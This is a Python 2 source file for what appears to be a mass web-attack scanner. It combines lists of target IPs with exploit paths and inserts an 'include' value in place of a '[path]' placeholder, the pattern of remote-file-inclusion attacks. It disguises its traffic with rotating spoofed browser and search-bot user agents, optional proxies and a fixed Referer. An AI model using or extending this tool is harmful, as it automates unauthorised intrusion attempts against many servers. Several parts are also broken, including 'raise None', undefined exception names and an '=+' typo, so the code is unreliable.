import Queue, time, urllib2, random
import threading, socket 

class Pipe:
    def __init__(self, inpipe, outpipe):
        self.inpipe= inpipe
        self.outpipe=outpipe
    


"""
    function input:
        x from target --> x from exploit
        
    function single:
        x from target --> E[0..exploit]
        
    function glob:
        E[0..target]  --> x from exploit
        
    function mass:
        E[0..target]  --> E[0..exploit]
"""

class Request(threading.Thread):
    global headers
    headers=[[('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)')],
             [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')],
             [('User-agent', 'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)')],
             [("IE 7 Vista","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")],
             [("Googlebot 2.1","Googlebot/2.1 (http://www.google.com/bot.html)")],
             [("Opera 9 (final) WinXP","Opera/9.00 (Windows NT 5.1; U; en)")],
             [("MSN Bot","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)")],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 4.0; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
             [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]


    def __init__(self, timer, target, proxy, include, exploit):
        threading.Thread.__init__(self)
        self.id = 0
        self.timer = timer
        self.target = target
        self.proxy = proxy
        self.include = include
        self.exploit = exploit
        self.flag= None
        self.stack=[]


    def GetExploit(self):
        return self.exploit

    def GetTarget(self):
        return self.target

    def starttiming(self):
        return time.time()

    def startscan(self):
        chrono=self.starttiming()
        self.id =+ 1


    def constructraw(self):
        self.exploit=self.exploit.replace('[path]','')
        return 'http://'+self.target+'/'+self.exploit+self.include


    def setinput(self):
        self.flag="input"

    def setsingle(self):
        self.flag="single"

    def setglob(self):
        self.flag="glob"

    def setmass(self):
        self.flag="mass"


    def openfile(self, path):
        try:
           fs=open(path, 'r')
           data=fs.readlines()
           return data
        except:
            pass
        
    
    def wget(self, url):
        #proxy syntax => proxy:port
      dfto=socket.getdefaulttimeout()
      socket.setdefaulttimeout(3)
      


      if self.proxy is None or self.proxy == '':
         opener = urllib2.build_opener()

      else:
            
         prox = "http://"+self.proxy
         proxies = urllib2.ProxyHandler({"http" : prox})
         opener = urllib2.build_opener(proxies)

      try:
          i = random.randrange(0,6,1)
          opener.addheaders = headers[i]
          urllib2.install_opener(opener)
          try:
              req = urllib2.Request(url)
              req.add_header('Referer', 'www.securynix.com')
              print url
              f=urllib2.urlopen(url, timeout=4)
              print f
              #   print "ok" 
              #   f = urllib2.urlopen(req,timeout=2)
                 #f = urllib2.urlopen(req,timeout=2) 
              if f is not None:
                  return  f.read()
              else:
                 print "non" 
                 return None
                
          except urllib2.httplib.BadStatusLine:
		 print "Error reading response"
		 return 0
          except IOError,e:
  		 raise None
          except URLError:
                 raise None
          except HTTPError:
                 raise None
      finally:
          socket.setdefaulttimeout(dfto)


    def massive_scan(self):
        tempo=[]
        for ip in self.target:
            for x in self.exploit:
               i='http://'+ip.strip()+'/'+x.strip()
               url=i.replace("[path]", self.include)
               tempo.append(url)
        self.stack=tempo


    def run(self):
        self.massive_scan()



